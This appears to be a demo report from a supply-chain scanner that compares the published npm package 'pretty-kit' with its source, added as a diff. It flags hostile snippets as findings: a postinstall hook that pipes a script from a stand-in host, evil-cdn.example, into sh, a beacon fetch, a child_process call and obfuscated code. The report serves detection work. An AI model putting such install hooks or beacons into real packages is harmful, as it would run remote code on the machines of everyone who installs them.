@@ -1,0 +1,312 @@
+{
+  "schema_version": "1.0",
+  "package": {
+    "ecosystem": "npm",
+    "name": "pretty-kit",
+    "version": "1.2.0",
+    "repo": "https://github.com/example/pretty-kit",
+    "commit": "a1b2c3d4e5f6789012345678901234567890abcd",
+    "source_resolution": "gitHead"
+  },
+  "summary": {
+    "verdict": "HIGH",
+    "score": 125,
+    "headline": "Release gains install-time execution, a new dependency, obfuscated extra code, and a network call the source never made.",
+    "counts": {
+      "identical": 1,
+      "modified": 2,
+      "added": 5,
+      "missing": 3,
+      "explained": 3,
+      "suspicious": 4
+    }
+  },
+  "provenance": {
+    "attestation_present": false,
+    "repo_match": null,
+    "commit_match": null,
+    "notes": [
+      "No npm provenance attestation for this version",
+      "gitHead is present on the registry metadata but was not provenance-signed"
+    ]
+  },
+  "capabilities": {
+    "source": {
+      "NETWORK": [],
+      "EXEC": [],
+      "EVAL": [],
+      "FS_SENSITIVE": [],
+      "ENV_ACCESS": ["process.env.NODE_ENV"],
+      "INSTALL_HOOK": [],
+      "NEW_DEPENDENCY": [],
+      "NATIVE_BINARY": [],
+      "DYNAMIC_REQUIRE": [],
+      "OBFUSCATION": []
+    },
+    "package": {
+      "NETWORK": ["evil-cdn.example"],
+      "EXEC": ["child_process.exec"],
+      "EVAL": [],
+      "FS_SENSITIVE": [],
+      "ENV_ACCESS": ["process.env.NODE_ENV"],
+      "INSTALL_HOOK": ["postinstall"],
+      "NEW_DEPENDENCY": ["left-pad-extra"],
+      "NATIVE_BINARY": [],
+      "DYNAMIC_REQUIRE": [],
+      "OBFUSCATION": ["_0x1a2b identifier pack"]
+    },
+    "gained": [
+      {
+        "category": "INSTALL_HOOK",
+        "detail": "postinstall script added",
+        "file": "package.json",
+        "line": 12
+      },
+      {
+        "category": "NETWORK",
+        "detail": "evil-cdn.example",
+        "file": "dist/index.js",
+        "line": 14
+      },
+      {
+        "category": "EXEC",
+        "detail": "child_process.exec",
+        "file": "dist/index.js",
+        "line": 13
+      },
+      {
+        "category": "NEW_DEPENDENCY",
+        "detail": "left-pad-extra",
+        "file": "package.json",
+        "line": 18
+      },
+      {
+        "category": "OBFUSCATION",
+        "detail": "_0x1a2b identifier pack",
+        "file": "lib/x.min.js",
+        "line": 1
+      }
+    ]
+  },
+  "files": [
+    {
+      "path": "README.md",
+      "bucket": "identical",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "Byte-identical to the reviewed source file.",
+      "findings": []
+    },
+    {
+      "path": "src/index.ts",
+      "bucket": "missing",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "TypeScript sources are omitted from the published tarball, which is expected.",
+      "findings": []
+    },
+    {
+      "path": "src/cli.ts",
+      "bucket": "missing",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "TypeScript sources are omitted from the published tarball, which is expected.",
+      "findings": []
+    },
+    {
+      "path": "tsconfig.json",
+      "bucket": "missing",
+      "status": "normal",
+      "explained_by": "none",
+      "reason": "Build config is omitted from the published tarball, which is expected.",
+      "findings": []
+    },
+    {
+      "path": "LICENSE",
+      "bucket": "added",
+      "status": "explained",
+      "explained_by": "config",
+      "reason": "LICENSE is listed in the package files field and contains no novel capabilities.",
+      "findings": []
+    },
+    {
+      "path": "dist/index.js.map",
+      "bucket": "added",
+      "status": "explained",
+      "explained_by": "config",
+      "reason": "Sourcemap sits in tsconfig.json outDir (dist/).",
+      "findings": []
+    },
+    {
+      "path": "dist/cli.js",
+      "bucket": "added",
+      "status": "explained",
+      "explained_by": "sourcemap",
+      "reason": "Map sources list src/cli.ts, which exists in the repository.",
+      "findings": []
+    },
+    {
+      "path": "package.json",
+      "bucket": "modified",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "Install hook and a dependency appear in the tarball but not in source package.json.",
+      "findings": [
+        {
+          "id": "install_hook_added",
+          "severity": "high",
+          "rule": "install_hooks",
+          "line": 12,
+          "snippet": "\"postinstall\": \"curl https://evil-cdn.example/setup.sh | sh\"",
+          "reason": "postinstall was added in the published package.json and is absent from source.",
+          "weight": 40
+        },
+        {
+          "id": "new_dependency",
+          "severity": "medium",
+          "rule": "deps",
+          "line": 18,
+          "snippet": "\"left-pad-extra\": \"1.0.0\"",
+          "reason": "Dependency left-pad-extra is not declared in the source package.json.",
+          "weight": 15
+        }
+      ]
+    },
+    {
+      "path": "dist/index.js",
+      "bucket": "modified",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "Compiled file contains a child_process call and a domain that never appear in source.",
+      "findings": [
+        {
+          "id": "exec_or_eval_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 13,
+          "snippet": "require(\"child_process\").exec(\"echo pkgtruth-demo\")",
+          "reason": "child_process.exec appears in the published dist/ but not in the source tree.",
+          "weight": 25
+        },
+        {
+          "id": "network_domain_gained",
+          "severity": "high",
+          "rule": "behavior",
+          "line": 14,
+          "snippet": "fetch(\"https://evil-cdn.example/beacon\")",
+          "reason": "Domain evil-cdn.example is absent from source string literals and declared dependencies.",
+          "weight": 25
+        },
+        {
+          "id": "string_not_in_source",
+          "severity": "medium",
+          "rule": "containment",
+          "line": 14,
+          "snippet": "https://evil-cdn.example/beacon",
+          "reason": "Novel URL string is not contained in the source tree.",
+          "weight": 20
+        }
+      ]
+    },
+    {
+      "path": "lib/x.min.js",
+      "bucket": "added",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "Extra minified file is not produced by tsconfig outDir and fails containment.",
+      "findings": [
+        {
+          "id": "obfuscated",
+          "severity": "high",
+          "rule": "obfuscation",
+          "line": 1,
+          "snippet": "var _0x1a2b=['ping','beacon'];var _0x4f= _0x1a2b[0];",
+          "reason": "Hex-style identifiers and packed strings with no matching source file.",
+          "weight": 30
+        },
+        {
+          "id": "unexplained_file",
+          "severity": "medium",
+          "rule": "diff",
+          "line": 1,
+          "snippet": "function _0x9c(){return _0x1a2b.join('.');}",
+          "reason": "Added file is not explained by sourcemap, config, or containment.",
+          "weight": 10
+        }
+      ]
+    },
+    {
+      "path": "lib/setup.js",
+      "bucket": "added",
+      "status": "suspicious",
+      "explained_by": "none",
+      "reason": "Helper referenced by the new postinstall script; not present in source.",
+      "findings": [
+        {
+          "id": "unexplained_file",
+          "severity": "low",
+          "rule": "diff",
+          "line": 2,
+          "snippet": "module.exports = { hook: \"postinstall\" };",
+          "reason": "Unexplained helper; no dangerous tokens by itself, so it does not drive the HIGH verdict alone.",
+          "weight": 10
+        }
+      ]
+    }
+  ],
+  "ai": {
+    "model": "qwen2.5-coder:7b",
+    "used": true,
+    "explanations": [
+      {
+        "file": "package.json",
+        "text": "The published manifest adds a postinstall script that fetches from a host the source never mentions, and it introduces a dependency that is not in the reviewed package.json. Those are capability gains, not compile artifacts.",
+        "quotes": [
+          {
+            "text": "\"postinstall\": \"curl https://evil-cdn.example/setup.sh | sh\"",
+            "line": 12,
+            "verified": true
+          },
+          {
+            "text": "\"left-pad-extra\": \"1.0.0\"",
+            "line": 18,
+            "verified": true
+          }
+        ]
+      },
+      {
+        "file": "dist/index.js",
+        "text": "A line was injected into compiled output. It shells out through child_process and then calls a domain that does not appear anywhere in the repository. Sourcemaps cannot explain those tokens because they are not in sourcesContent.",
+        "quotes": [
+          {
+            "text": "require(\"child_process\").exec(\"echo pkgtruth-demo\")",
+            "line": 13,
+            "verified": true
+          },
+          {
+            "text": "fetch(\"https://evil-cdn.example/beacon\")",
+            "line": 14,
+            "verified": true
+          },
+          {
+            "text": "this quote is not in the file",
+            "line": 99,
+            "verified": false
+          }
+        ]
+      },
+      {
+        "file": "lib/x.min.js",
+        "text": "This extra file uses packed _0x identifiers and is not referenced by tsconfig outDir. Treat it as unexplained obfuscation, not minified project code.",
+        "quotes": [
+          {
+            "text": "var _0x1a2b=['ping','beacon'];var _0x4f= _0x1a2b[0];",
+            "line": 1,
+            "verified": true
+          }
+        ]
+      }
+    ]
+  },
+  "generated_at": "2026-10-31T18:11:00Z"
+}
